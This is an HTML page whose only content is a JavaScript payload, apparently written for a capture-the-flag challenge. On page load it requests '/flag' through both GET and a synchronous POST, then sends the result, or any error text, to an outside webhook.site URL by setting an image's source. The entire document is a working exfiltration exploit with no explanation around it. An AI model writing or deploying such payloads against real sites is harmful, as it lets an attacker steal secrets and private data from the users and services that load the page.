<!DOCTYPE html>
<html>
<body>
<script>
const WEBHOOK = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";

// Intentar con GET
fetch("/flag")
  .then(r => r.text())
  .then(flag => {
    var img = new Image();
    img.src = WEBHOOK + "?get_flag=" + encodeURIComponent(flag);
  })
  .catch(e => {
    var img = new Image();
    img.src = WEBHOOK + "?get_error=" + encodeURIComponent(e.toString());
  });

// También probar la función view_flag() original
function post(url, params={}){
  var params_post = [];
  for(const key in params){
    params_post.push(`${key}=${params[key]}`);
  }
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  xhr.send(params_post.join("&"));
  return xhr.responseText;
}

try {
  var flag = post("/flag");
  var img = new Image();
  img.src = WEBHOOK + "?post_flag=" + encodeURIComponent(flag);
} catch(e) {
  var img = new Image();
  img.src = WEBHOOK + "?post_error=" + encodeURIComponent(e.toString());
}
</script>
</body>
</html>
